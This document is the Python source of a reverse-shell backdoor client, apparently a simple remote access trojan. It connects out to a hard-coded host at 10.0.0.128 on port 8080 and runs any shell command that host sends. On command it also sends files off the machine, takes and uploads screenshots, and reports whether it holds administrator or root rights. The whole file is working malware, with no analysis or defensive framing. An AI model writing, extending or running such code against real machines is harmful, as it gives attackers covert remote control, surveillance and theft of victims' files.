#client
#priv check
import shutil
import socket
import subprocess
import os
import ctypes

from PIL import ImageGrab

import tempfile

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(5000)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        f.close()
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())

def connecting():
    s = socket.socket()
    s.connect(("10.0.0.128", 8080))

    while True:
        command = s.recv(5000)

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        elif 'screenshot' in command.decode():
# create a temp dir to store our screenshot file
# sample dirpath: C:\Users|hadjona|appdata\Local\temp\temp574823789
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "/img.jpg", "JPEG")
            transfer(s, dirpath + "/img.jpg")
            shutil.rmtree(dirpath)


        elif 'priv' in command.decode():
            try:
                if os.name == 'nt':
                    if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                        s.send("You have Admin privileges (Windows).".encode())
                    else:
                        s.send("You are a normal user (Windows).".encode())
                # Check for Linux root privileges
                else:
                    if os.getuid() == 0:
                        s.send("You have Root privileges (Linux).".encode())
                    else:
                        s.send("You are a normal user (Linux).".encode())
            except Exception as e:
                s.send(f"Error checking privileges: {str(e)}".encode())
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    connecting()
main()